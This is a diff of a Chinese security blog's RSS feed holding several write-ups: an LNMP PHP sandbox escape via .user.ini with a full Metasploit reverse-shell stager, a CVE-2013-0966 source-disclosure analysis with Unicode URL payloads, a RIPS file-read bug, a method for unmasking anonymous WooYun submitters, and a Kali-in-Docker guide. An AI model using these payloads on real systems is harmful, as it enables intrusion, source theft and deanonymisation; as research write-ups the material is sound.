+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/Screen%20Shot%202016-04-16%20at%2010.05.23%20PM.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/5203.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这块是实时更新的，准备工作：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;(贡献榜漏洞数-个人主页漏洞数)=匿名漏洞数&lt;/li&gt;
+  &lt;li&gt;非匿名漏洞关注数&lt;/li&gt;
+  &lt;li&gt;(白帽子人气榜-&amp;gt;漏洞关注数-非匿名漏洞关注数)=个人所有匿名漏洞的关注数&lt;/li&gt;
+  &lt;li&gt;采集路人甲所有漏洞，或者特定时间段的。&lt;/li&gt;
+  &lt;li&gt;采集所有注册了乌云并且提交过匿名漏洞的id数据。&lt;/li&gt;
+  &lt;li&gt;https://web.archive.org/web/*/wooyun.org&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;      这里存在一个不确定因素：没有登录所提交的漏洞（之前的时间段排除：新注册id所提交的漏洞），但同样有基于未来时间段的解决方案：&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;锁定路人甲漏洞，一小时计算一次所有id匿名漏洞数，如果无出入的话，这个匿名漏洞就是未登录提交的，有出入则列出范围内的id。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;正向数据匹配：&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;寻找路人甲某个漏洞的特定时间段，在这个时间段都哪些白帽子增加了匿名提交个数。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;反向数据匹配：&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;从哪个时间点到哪个时间点白帽子增加匿名漏洞个数。在进行缩减范围。这个时间段中还有谁增加了匿名漏洞个数，并且这个时间段路人甲都提交了哪些漏洞。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;交叉数据匹配：&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;以上两点再根据上面的匹配关注数的方法进行匹配。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;当我又回首一切，这个世界会好吗？
+&lt;/code&gt;&lt;/pre&gt;
+</description>
 <pubDate>Sun, 25 Dec 2016 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2016/12/25/wooyun-anonymous-reverse.html</link>
 <guid isPermaLink="true">http://localhost:4000/2016/12/25/wooyun-anonymous-reverse.html</guid>
@@ -99,6 +1131,88 @@
 
 <item>
 <title>LNMP虚拟主机PHP沙盒逃逸</title>
+<description>&lt;h1 id=&quot;lnmp虚拟主机php沙盒逃逸&quot;&gt;LNMP虚拟主机PHP沙盒逃逸&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;13 Jul 2016 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;p&gt;      并不只是针对Lnmp的沙盒逃逸，而是.user.ini的设计缺陷达到绕过open_basedir限制，所以是通用的方法。首先来看看最新版LNMP是怎么配置open_basedir的：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;open_basedir=/home/wwwroot/default:/tmp/:/proc/
+
+lsattr .user.ini
+----i----------- .user.ini
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      LNMP的open_basedir是通过.user.ini来配置的。再来看disable_functions都禁用了哪些函数：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;lnmp1.3/include/php.sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/5ethrdfb.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      注意到了stream_socket_server被禁用了。这个是用来建立Socket服务端的，完全可以使用其他可创建socket服务端的函数进行反弹个socket会话，比如socket_create、 fsockopen。不过虽是可以建立socket会话，但group为www，所以这个留在后面结合使用。&lt;/p&gt;
+
+&lt;p&gt;      .user.ini是不允许增删改的，那怎样能突破限制？.user.ini只在当前目录生效了。那么我们可不可以写入新的.user.ini并且不与原.user.ini冲突，将其open_basedir指向根目录？可以的。&lt;/p&gt;
+
+&lt;p&gt;      首先创建一个目录并写入新的.user.ini。新的.user.ini需要1-3min来生效。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;open_basedir=/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      最后结合socket，使用msf在新目录生成个反向代理payload并稍加更改就可以了。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+error_reporting(0);
+
+$ip = '192.168.137.67';
+$port = 4444;
+$ipf = AF_INET;
+if (FALSE !== strpos($ip, &quot;:&quot;)) {
+	$ip = &quot;[&quot;. $ip .&quot;]&quot;;
+	$ipf = AF_INET6;
+}
+if (($f = 'fsockopen') &amp;amp;&amp;amp; is_callable($f)) {
+	$s = $f($ip, $port);
+	$s_type = 'stream';
+} elseif (($f = 'socket_create') &amp;amp;&amp;amp; is_callable($f)) {
+	$s = $f($ipf, SOCK_STREAM, SOL_TCP);
+	$res = @socket_connect($s, $ip, $port);
+	if (!$res) {
+		die(); 
+	}
+	$s_type = 'socket';
+} else {
+	die('no socket funcs');
+}
+if (!$s) {
+	die('no socket');
+}
+
+switch ($s_type) {
+	case 'stream': $len = fread($s, 4); break;
+	case 'socket': $len = socket_read($s, 4); break;
+}
+
+if (!$len) {
+	die();
+}
+
+$a = unpack(&quot;Nlen&quot;, $len); $len = $a['len'];
+$b = '';
+while (strlen($b) &amp;lt; $len) {
+	switch ($s_type) {
+		case 'stream': $b .= fread($s, $len-strlen($b)); break;
+		case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
+	}
+}
+$GLOBALS['msgsock'] = $s;
+$GLOBALS['msgsock_type'] = $s_type;
+eval($b);
+die();
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/rsd.png&quot; /&gt;&lt;/p&gt;
+</description>
 <pubDate>Wed, 13 Jul 2016 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2016/07/13/lnmp-sandbox-bypass.html</link>
 <guid isPermaLink="true">http://localhost:4000/2016/07/13/lnmp-sandbox-bypass.html</guid>
@@ -106,6 +1220,160 @@
 
 <item>
 <title>Osx Apache Code To Disclose CVE-2013-0966 漏洞分析</title>
+<description>&lt;h1 id=&quot;osx-apache-code-to-disclose-cve-2013-0966-漏洞分析&quot;&gt;Osx Apache Code To Disclose CVE-2013-0966 漏洞分析&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;01 Jun 2016 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;h4 id=&quot;0x00-写在开头&quot;&gt;0x00 写在开头&lt;/h4&gt;
+
+&lt;p&gt;      这个漏洞从cve编号可以看出是三年前的了，当时关注的人并不多，也没有对外放出漏洞分析的Paper，可能是使用Osx Server做web服务器没有普及吧。不过这个漏洞的确很暴力，让我想起了和十几年前CVE-1999-0278 IIS 3.0/4.0 ::$DATA请求返回ASP源代码漏洞很像。。。&lt;/p&gt;
+
+&lt;h4 id=&quot;0x01-漏洞分析&quot;&gt;0x01 漏洞分析&lt;/h4&gt;
+
+&lt;p&gt;      最开始是在本地发现的，在请求文件名中插入BOM头字符会直接返回后端的代码：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/03235511c2a5182171f420e55a9eef04fdd2ad02.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      当时此漏洞的描述是：&lt;/p&gt;
+
+&lt;p&gt;      The Apple mod_hfs_apple module for the Apache HTTP Server in Apple Mac OS X before 10.8.3 does not properly handle ignorable Unicode characters, which allows remote attackers to bypass intended directory authentication requirements via a crafted pathname in a URI.&lt;/p&gt;
+
+&lt;p&gt;      意思就是运行Apache的Osx服务器上，数据取自HFS+文件系统，HFS+用unicode来命名文件或文件夹。根据HFS+特性，当视图向HFS+请求文件时，接收到的这个文件名中含有可被HFS+忽略掉的unicode序列的话，照常返回这个正常文件名的文件。而作为apache for mac在处理这种请求时，导致请求的文件没有在服务器上执行，也就是将所请求的文件当做普通文件来响应请求。&lt;/p&gt;
+
+&lt;p&gt;      比如这些空的unicode字符序列都会被HFS+忽略：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/03235042f97be2f10da2075940c99257a272074d.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      再来看看Apple的&lt;a href=&quot;https://support.apple.com/zh-cn/HT202694&quot;&gt;公告&lt;/a&gt;：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/4fe.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Apple对这个漏洞的定义只是绕过了HTTP基本认证，过于模棱两可。所以我把这个漏洞的标题定义为”Code To Disclose Vulnerability”。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/0421155498fc6f652b4f0e6d44d51a3dabfe40ad.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      这个漏洞的描述是说mod_hfs_apple模块没有正确处理掉这些unicode序列，这个模块的最初意义是用来处理URI请求信息的，比如文件名大小写等等事情，并且是用户自愿启不启用的。所以补丁就打在了mod_hfs_apple模块：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;static int contains_ignorable_sequence(char* s) {
+
+size_t len = strlen(s);
+
+if (len &amp;lt;= 2) return 0;
+
+for (size_t i = 0; i &amp;lt;= len - 2; i++) {
+
+	// 2-char sequences
+
+	if (s[i] == '\xFC' &amp;amp;&amp;amp; '\x80' &amp;lt;= s[i+1] &amp;amp;&amp;amp; s[i+1] &amp;lt;= '\x83') return 1;
+
+	if (s[i] == '\xF8' &amp;amp;&amp;amp; '\x80' &amp;lt;= s[i+1] &amp;amp;&amp;amp; s[i+1] &amp;lt;= '\x87') return 1;
+
+	if (s[i] == '\xF0' &amp;amp;&amp;amp; '\x80' &amp;lt;= s[i+1] &amp;amp;&amp;amp; s[i+1] &amp;lt;= '\x8F') return 1;
+
+	if (i &amp;lt;= len - 3) {
+
+		// 3-char sequences
+
+		if (s[i] == '\xEF' &amp;amp;&amp;amp; s[i+1] =='\xBB' &amp;amp;&amp;amp; s[i+2] =='\xBF') return 1;
+
+		if (s[i] == '\xE2' &amp;amp;&amp;amp; s[i+1] =='\x81' &amp;amp;&amp;amp; '\xAA' &amp;lt;= s[i+2] &amp;amp;&amp;amp; s[i+2] &amp;lt;= '\xAF') return 1;
+
+		if (s[i] == '\xE2' &amp;amp;&amp;amp; s[i+1] =='\x80' &amp;amp;&amp;amp; (('\x8C' &amp;lt;= s[i+2] &amp;amp;&amp;amp; s[i+2] &amp;lt;= '\x8F') || ('\xAA' &amp;lt;= s[i+2] &amp;amp;&amp;amp; s[i+2] &amp;lt;= '\xAE'))) return 1;
+
+	}
+
+}
+
+return 0;
+
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      contains_ignorable_sequence函数将这些可被HFS+忽略的unicode序列集中了起来：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;\xFC[\x80-\x83]
+\xF8[\x80-\x87]
+\xF0[\x80-\x8F]
+\xEF\xBB\xBF
+\xE2\x81[\xAA-\xAF]
+\xE2\x80[\x8C-\x8F\xAA-\xAE]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      在hfs_apple_module_fixups函数中调用了contains_ignorable_sequence：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;if (contains_ignorable_sequence(r-&amp;gt;filename)) {
+
+	ap_log_rerror(APLOG_MARK, APLOG_NOERRNO|APLOG_ERR, 0, r,
+
+			  &quot;mod_hfs_apple: URI %s has ignorable character sequence. Denying access.&quot;,
+
+			  r-&amp;gt;filename);
+
+	return HTTP_FORBIDDEN;
+
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      当URI中的filename存在这些字符序列时，则返回为这个请求是禁止的。更有意思的事情是，补丁虽然打了，但Apple还是没有将mod_hfs_apple模块设为默认加载，在虚拟机上安装了OS X Yosemite 10.10来看看。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/01151244817cb1ad2440184c83afe16bba26039f.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      直到去年有安全研究员提出了”osx apache没有默认加载mod_hfs_apple模块那么打补丁有什么意义？” CVE-2015-3675就这么诞生了2333。&lt;/p&gt;
+
+&lt;p&gt;      The default configuration of the Apache HTTP Server on Apple OS X before 10.10.4 does not enable the mod_hfs_apple module, which allows remote attackers to bypass HTTP authentication via a crafted URL.&lt;/p&gt;
+
+&lt;p&gt;https://support.apple.com/zh-cn/HT204942&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/4444.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      修补的方式就是默认加载了。我本机是OSX EI Caption 10.11.6，自带的Apache默认加载了这个模块：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/6tt.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;0x02-漏洞蔓延&quot;&gt;0x02 漏洞蔓延&lt;/h4&gt;
+
+&lt;p&gt;      根据服务+操作系统+第三方包指纹搜索，发现在公网架设Apache服务的Osx系统中，用集成包的要比用系统原生的多，MAMP这几个就犹如win下的php study等等第三方包一样流行，MAMP在Bitnami上也很流行，这就很尴尬了。&lt;/p&gt;
+
+&lt;p&gt;MAMP &amp;amp; MAMP Pro(2015-12-14):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/011519390827084e57aa7c78373b8faef228197b.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;XAMPP(2016-04-21):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/011523524d67e25007dfc50ca6557b29820cfa3f.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;AMPPS(2015-01-03):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/011541228e7c5de5424f3967e04b1dbe1554c098.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Payload：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;%EF%BB%BF
+%E2%81%AA
+%E2%81%AB
+%E2%81%AC
+%E2%81%AD
+%E2%81%AE
+%E2%81%AF
+%E2%80%AE
+%E2%80%8C
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;MAMP &amp;amp; MAMP Pro：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;AMPPS：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/2.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;XAMPP:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/3.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;0x03-写在最后&quot;&gt;0x03 写在最后&lt;/h4&gt;
+
+&lt;p&gt;      虽然第三方包居多，但是想找得更全很难，毕竟是中间件的第三方包，很多站建起来就不好找是不是用这个第三方包搭建的。此漏洞完整的生命线就到这儿了，感兴趣的可以继续研究下补丁。&lt;/p&gt;
+</description>
 <pubDate>Wed, 01 Jun 2016 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2016/06/01/osx-code-disclose-cve-2013-0966.html</link>
 <guid isPermaLink="true">http://localhost:4000/2016/06/01/osx-code-disclose-cve-2013-0966.html</guid>
@@ -113,6 +1381,78 @@
 
 <item>
 <title>Rips Scanners 本地文件读取漏洞分析</title>
+<description>&lt;h1 id=&quot;rips-scanners-本地文件读取漏洞分析&quot;&gt;Rips Scanners 本地文件读取漏洞分析&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;27 Dec 2015 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;p&gt;      &lt;strong&gt;RIPS是一个源代码分析工具，它使用了静态分析技术，能够自动化地挖掘PHP源代码潜在的安全漏洞。渗透测试人员可以直接容易的审阅分析结果，而不用审阅整个程序代码。由于静态源代码分析的限制，漏洞是否真正存在，仍然需要代码审阅者确认。RIPS能够检测XSS, SQL注入, 文件泄露, LFI/RFI, RCE漏洞等。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;/rips-0.55/windows/code.php 第102行&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;$file = $_GET['file'];
+$marklines = explode(',', $_GET['lines']);
+$ext = '.'.pathinfo($file, PATHINFO_EXTENSION);
+
+
+if(!empty($file) &amp;amp;&amp;amp; is_file($file) &amp;amp;&amp;amp; in_array($ext, $FILETYPES))
+{
+	$lines = file($file); 
+	
+	// place line numbers in extra table for more elegant copy/paste without line numbers
+	echo '&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;table&amp;gt;';
+	for($i=1, $max=count($lines); $i&amp;lt;=$max;$i++) 
+		echo &quot;&amp;lt;tr&amp;gt;&amp;lt;td class=\&quot;linenrcolumn\&quot;&amp;gt;&amp;lt;span class=\&quot;linenr\&quot;&amp;gt;$i&amp;lt;/span&amp;gt;&amp;lt;A id='&quot;.($i+2).'\'&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;';
+	echo '&amp;lt;/table&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td id=&quot;codeonly&quot;&amp;gt;&amp;lt;table id=&quot;codetable&quot; width=&quot;100%&quot;&amp;gt;';
+	
+	$in_comment = false;
+	for($i=0; $i&amp;lt;$max; $i++)
+	{				
+		$in_comment = highlightline($lines[$i], $i+1, $marklines, $in_comment);
+	}
+} else
+{
+	echo '&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Invalid file specified.&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;';
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;$file为GET过来的，验证是否为文件，如果是就将其传入到数组，然后打印出来，算是本地文件读取吧。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;      &lt;strong&gt;翻到RIPS前版本发现漏洞是同样存在的。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/54rtgdfcvx.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      &lt;strong&gt;相比来看利用的条件比前版本鸡肋一点，新版本验证了扩展名，而前版本可以读取文件的范围更广。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ext = '.'.pathinfo($file, PATHINFO_EXTENSION);
+if(!empty($file) &amp;amp;&amp;amp; is_file($file) &amp;amp;&amp;amp; in_array($ext, $FILETYPES))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;跟踪到/rips-0.55/config/general.php 第49行&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;$FILETYPES = array(						// filetypes to scan
+	'.php', 
+	'.inc', 
+	'.phps', 
+	'.php4', 
+	'.php5', 
+	//'.html', 
+	//'.htm', 
+	//'.txt',
+	'.phtml', 
+	'.tpl',  
+	'.cgi'
+); 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      &lt;strong&gt;以上为RIPS新版本允许读取文件的扩展名，最后来个利用:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/5555rrfdd.png&quot; /&gt;&lt;/p&gt;
+</description>
 <pubDate>Sun, 27 Dec 2015 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2015/12/27/rips-scanners-vul.html</link>
 <guid isPermaLink="true">http://localhost:4000/2015/12/27/rips-scanners-vul.html</guid>
@@ -120,6 +1460,131 @@
 
 <item>
 <title>Under The Docker Run Kali Linux</title>
+<description>&lt;h1 id=&quot;under-the-docker-run-kali-linux&quot;&gt;Under The Docker Run Kali Linux&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;13 Nov 2015 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;h4 id=&quot;简介&quot;&gt;简介&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code&gt;Docker&lt;/code&gt;是一个由GO语言写的程序运行的开源的应用&lt;code&gt;容器&lt;/code&gt;引擎（Linux containers， LXCs），让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）。几乎没有性能开销,可以很容易地在机器和数据中心中运行。最重要的是,他们不依赖于任何语言、框架包括系统。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code&gt;Kali Linux&lt;/code&gt;是基于Debian的Linux发行版， 设计用于数字取证和渗透测试 和 黑客攻防。
+Kali Linux预装了许多渗透测试软件，包括nmap (端口扫描器)、Wireshark (数据包分析器)、John the Ripper (密码破解器),以及Aircrack-ng (一套用于对无线局域网进行渗透测试的软件). 用户可通过硬盘、live CD或live USB运行Kali Linux。Metasploit的Metasploit Framework支持Kali Linux，Metasploit一套针对远程主机进行开发和执行Exploit代码的工具。&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;好处&quot;&gt;好处&lt;/h4&gt;
+&lt;p&gt;      Docker相比KVM之类最明显的特点就是启动快，资源占用小。因此对于构建隔离的标准化的运行环境，轻量级的PaaS， 构建自动化测试和持续集成环境，以及一切可以横向扩展的应用都可轻松应对。具体说来，&lt;code&gt;Docker在如下几个方面具有较大的优势&lt;/code&gt;：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;更快速的交付和部署&lt;/li&gt;
+  &lt;li&gt;更高效的虚拟化&lt;/li&gt;
+  &lt;li&gt;更轻松的迁移和扩展&lt;/li&gt;
+  &lt;li&gt;更简单的管理&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;      kali原镜像所含的渗透套件很丰富，基本渗透中的需求都可以满足，但是长期使用会显得有些臃肿，比如换个环境(迁移)，扔锅(被取证)等等，既然想&lt;code&gt;方便&lt;/code&gt;/&lt;code&gt;快捷&lt;/code&gt;/&lt;code&gt;高效&lt;/code&gt;的使用Kali，Docker虚拟化再合适不过。&lt;/p&gt;
+
+&lt;h4 id=&quot;安装docker&quot;&gt;安装Docker&lt;/h4&gt;
+&lt;p&gt;      我是在&lt;code&gt;Mac&lt;/code&gt;下安装的Docker，Docker引擎使用了Linux内核特定的特性，所以要让它运行在OS X上我们需要用一个轻量型的虚拟机，如(Virtualbox, Vmware Fusion, Parallel Desktop)等。用OS X的Docker客户端来控制虚拟Docker来构建，运行以及管理Docker容器。&lt;/p&gt;
+
+&lt;p&gt;      Boot2Docker是帮助控制虚拟机中 Docker 的工具，它会下载一个安装好docker的虚拟机，并控制其实现docker功能：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;brew install boot2docker
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;安装Docker client：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# Get the docker client file
+DIR=$(mktemp -d ${TMPDIR:-/tmp}/dockerdl.XXXXXXX) &amp;amp;&amp;amp; \
+curl -f -o $DIR/ld.tgz https://get.docker.io/builds/Darwin/x86_64/docker-latest.tgz &amp;amp;&amp;amp; \
+gunzip $DIR/ld.tgz &amp;amp;&amp;amp; \
+tar xvf $DIR/ld.tar -C $DIR/ &amp;amp;&amp;amp; \
+cp $DIR/usr/local/bin/docker ./docker
+
+# Set the environment variable for the docker daemon
+export DOCKER_HOST=tcp://127.0.0.1:4243
+
+# Copy the executable file
+sudo cp docker /usr/local/bin/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      或者直接使用&lt;a href=&quot;https://github.com/boot2docker/osx-installer/releases&quot;&gt;Boot2Docker.pkg&lt;/a&gt;安装，安装好后运行boot2docker这个client command，这个过程会进行初始化下载一个boot2docer.iso，然后会用ssh生成用于docker的ssh的公钥和私钥对，用于远程.&lt;/p&gt;
+
+&lt;p&gt;初始化后运行boot2docker报了个错，对应设置到环境变量即可。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜ ~ boot2docker start
+Waiting for VM and Docker daemon to start...
+.o
+Started.
+Writing /Users/CongRong/.boot2docker/certs/boot2docker-vm/ca.pem
+Writing /Users/CongRong/.boot2docker/certs/boot2docker-vm/cert.pem
+Writing /Users/CongRong/.boot2docker/certs/boot2docker-vm/key.pem
+Your environment variables are already set correctly.
+
+To connect the Docker client to the Docker daemon, please set:
+export DOCKER_CERT_PATH=/Users/CongRong/.boot2docker/certs/boot2docker-vm
+export DOCKER_TLS_VERIFY=1
+export DOCKER_HOST=tcp://192.168.59.103:2376
+
+Or run: `eval &quot;$(boot2docker shellinit)&quot;`
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&quot;安装镜像&quot;&gt;安装镜像&lt;/h4&gt;
+&lt;p&gt;      kali-linux-docker的&lt;a href=&quot;https://hub.docker.com/r/kalilinux/kali-linux-docker/&quot;&gt;DockerHub主页&lt;/a&gt;，或者直接搜索：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜ ~ docker search kali
+NAME                                      DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED
+kalilinux/kali-linux-docker               Kali Linux 2.x Base Image                       120                  [OK]
+linuxkonsult/kali-metasploit              Kali base image with metasploit                 26                   [OK]
+linuxkonsult/kali                         Kali Linux 2.0 base image                       8
+brimstone/kali                                                                            3                    [OK]
+kkirsche/kali-linux-docker                Unofficial Kali Linux Docker                    2                    [OK]
+kalilinux/kali-linux-docker-rolling       Kali Linux Rolling Docker Image                 2                    [OK]
+wsec/kali-metasploit                      Official Kali Base image + Metasploit           2                    [OK]
+officialkali/kali                                                                         2
+kalilinux/kali                                                                            2
+lodelestra/kali-linux-metasploit-docker   metasploit docker based on kali-linux-docker    1                    [OK]
+ctarwater/kali-msf                        Kali + Metasploit + Postgresql                  1                    [OK]
+e3rp4y/kali-metasploit                                                                    1                    [OK]
+blackfinsecurity/tha-kali                                                                 1                    [OK]
+andresriancho/w3af-kali                                                                   0                    [OK]
+ctarwater/kali                            Kali base image (no tools)                      0                    [OK]
+netxp/kali                                kali                                            0                    [OK]
+johnsandiford/kali                                                                        0                    [OK]
+miteshshah/kali                           Kali Linux                                      0                    [OK]
+nicot/kali                                                                                0                    [OK]
+lxj616/docker-kali-custom-tools           docker-kali-custom-tools                        0                    [OK]
+jasonchaffee/kali-linux                   Kali Linux Docker Container                     0                    [OK]
+ctarwater/kali-msf-micro                  Kali + Metasploit with all of the Metasplo...   0                    [OK]
+scottj/kali-docker                        Custom Kali 2.0 Docker Build                    0                    [OK]
+digitalshokunin/kali-metasploit                                                           0                    [OK]
+butlerrc30/kali-ssh                       Kali image that generates random cert for ...   0                    [OK]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;安装Kali：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;docker pull kalilinux/kali-linux-docker
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;拉取安装后就可以启动了，因为是纯净的kali镜像所以只有420MB，需要什么直接apt-get。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/3r4tgdfxvc.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;常见问题&quot;&gt;常见问题&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;http://stackoverflow.com/questions/29799491/after-upgrade-boot2docker-1-5-to-1-6-error-appendfailed-to-get-machine-boot2do/29819016&quot;&gt;After upgrade Boot2Docker 1.5 to 1.6 error append:Failed to get machine “boot2docker-vm”: machine does not exist (Did you run &lt;code&gt;boot2docker init&lt;/code&gt;?)&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;http://stackoverflow.com/questions/26572112/how-to-fix-error-in-run-failed-to-get-machine-boot2docker-vm-machine-does-n&quot;&gt;How to fix “error in run: Failed to get machine ”boot2docker-vm“: machine does not exist”?&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
